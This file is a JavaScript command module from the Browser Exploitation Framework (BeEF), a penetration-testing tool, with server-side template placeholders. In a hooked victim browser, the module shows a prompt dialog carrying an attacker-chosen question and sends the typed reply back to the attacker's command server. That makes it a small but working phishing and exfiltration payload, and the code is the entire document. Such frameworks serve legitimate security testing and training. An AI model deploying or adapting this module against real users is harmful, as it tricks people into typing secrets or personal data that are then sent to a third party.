//
// Copyright (c) 2006-2024 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
  var answer = prompt("<%== @question %>","")
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);
});
